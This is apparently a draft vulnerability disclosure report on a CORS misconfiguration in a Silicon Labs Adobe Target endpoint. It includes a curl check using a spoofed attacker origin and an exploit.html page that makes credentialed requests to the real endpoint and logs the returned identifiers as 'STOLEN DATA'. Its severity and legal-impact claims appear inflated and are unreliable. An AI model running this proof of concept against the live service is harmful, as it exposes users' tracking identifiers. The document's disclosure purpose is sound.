
Subject: [Critical] CWE-942: CORS Misconfig in Adobe Target API (Silabs Integration)  
Severity: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H=9.1  
Researcher: [Your Name/HackerOne ID]  
Disclosure: Full after 90 days per policy  

### Vulnerability Details  
**Affected Endpoint**:  
`POST https://siliconlabs.tt.omtrdc.net/rest/v1/delivery`  

**Vulnerability**:  
- Reflects attacker-controlled `Origin` header  
- Returns `Access-Control-Allow-Credentials: true`  
- Exposes `marketingCloudVisitorId` (persistent user identifier)  

### Proof of Concept  

```bash
# Step 1: Verify CORS misconfiguration
curl -H "Origin: https://attacker.com" -I \
https://siliconlabs.tt.omtrdc.net/rest/v1/delivery

# Expected response:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```


# Step 2: Reproduce data theft (attached exploit.html)

### Full Reproduction Steps

1. Login to `https://www.silabs.com`
    
2. Host [attached exploit.html]
    
3. Visit malicious page → Observe exfiltration
    

### Evidence Attachments

1. `exploit.html`: Self-contained PoC
    
2. `curl-output.txt`: Full CORS verification output
    
3. `session-data.json`: Redacted response sample:
    

	json
	
	{
	  "status": 200,
	  "id": {
	    "marketingCloudVisitorId": "REDACTED"
	  }
	}

### Compliance Impact

Exposed `marketingCloudVisitorId` violates:

- GDPR Articles 5(1)f, 32
    
- CCPA § 1798.150
    

### Remediation

**Immediate Actions**:

nginx

# Adobe-side CORS policy
allowedOrigins = ["https://www.silabs.com"]
allowCredentials = false

**Validation Command**:

bash

curl -H "Origin: https://attacker.com" -I \
https://siliconlabs.tt.omtrdc.net/rest/v1/delivery
# Expected: 403/404 if fixed

#### `exploit.html`


```html

<!DOCTYPE html>
<html><body>
<script>
fetch('https://siliconlabs.tt.omtrdc.net/rest/v1/delivery?client=siliconlabs&version=2.11.7', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({})
})
.then(r => r.text())
.then(data => console.log("STOLEN DATA:", data))
</script>
</body></html>
```